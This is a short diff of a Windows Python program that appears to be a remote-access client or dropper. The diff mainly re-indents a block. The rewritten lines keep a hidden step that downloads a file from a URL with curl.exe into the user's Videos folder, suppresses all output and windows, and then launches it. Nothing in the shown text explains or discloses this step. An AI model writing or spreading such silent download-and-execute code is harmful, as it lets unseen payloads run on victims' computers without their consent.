@@ -7,6 +7,7 @@ import threading
 import winreg
 import getpass
 import shutil
+import time
 import pygame
 
 CLIENT_NAME = getpass.getuser()
@@ -103,24 +104,23 @@ def reinstall_program(standartInstall=True):
                 ],
                 stdout=subprocess.DEVNULL,
                 stderr=subprocess.DEVNULL,
-                creationflags=subprocess.CREATE_NO_WINDOW
+                creationflags=CREATE_NO_WINDOW
             )
     else:
         videos_dir = os.path.join(os.environ["USERPROFILE"], "Videos")
         output_path = os.path.join(videos_dir, filename)
-
-                    subprocess.run(
-                    [
-                        "curl.exe",
-                        "-L",
-                        url,
-                        "-o",
-                        output_path
-                    ],
-                    stdout=subprocess.DEVNULL,
-                    stderr=subprocess.DEVNULL,
-                    creationflags=subprocess.CREATE_NO_WINDOW
-                )
+        subprocess.run(
+            [
+                "curl.exe",
+                "-L",
+                url,
+                "-o",
+                output_path
+            ],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            creationflags=CREATE_NO_WINDOW
+        )
         subprocess.Popen(output_path)
     
     check_reinstall()
